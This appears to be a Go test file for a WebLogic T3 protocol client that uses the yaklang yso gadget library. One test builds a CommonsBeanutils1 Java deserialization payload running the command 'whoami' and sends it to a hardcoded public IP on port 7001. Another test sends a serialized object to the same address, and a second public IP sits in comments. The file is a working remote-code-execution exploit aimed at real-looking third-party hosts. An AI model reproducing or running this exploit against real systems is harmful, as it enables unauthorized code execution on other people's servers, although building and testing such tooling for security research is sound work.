package t3

import (
	"github.com/yaklang/yaklang/common/yso"
	"testing"
)

func TestSendHello(t *testing.T) {
	req := NewT3Request()

	ser, err := GetObject("AuthenticatedUser")
	if err != nil {
		t.Fatal(err)
	}
	req.WriteMsgAbbrev(ser[0])
	//req.Bytes()
	t3 := NewT3Client()
	//err := t3.ConnectServer("t3://34.228.52.53:7001")
	err = t3.ConnectServer("t3://172.245.57.186:7001")
	if err != nil {
		t.Fatal(err)
	}

	t3.Send(req)
	//t3.PushObject()
}
func TestDeserialized(t *testing.T) {
	req := NewT3Request()

	ser, err := yso.GetCommonsBeanutils1JavaObject(yso.SetExecCommand("whoami"))
	if err != nil {
		t.Fatal(err)
	}
	req.WriteMsgAbbrev(ser)
	//req.Bytes()
	t3 := NewT3Client()
	//err := t3.ConnectServer("t3://34.228.52.53:7001")
	err = t3.ConnectServer("t3://172.245.57.186:7001")
	if err != nil {
		t.Fatal(err)
	}
	err = t3.Send(req)
	if err != nil {
		t.Fatal(err)
	}
}
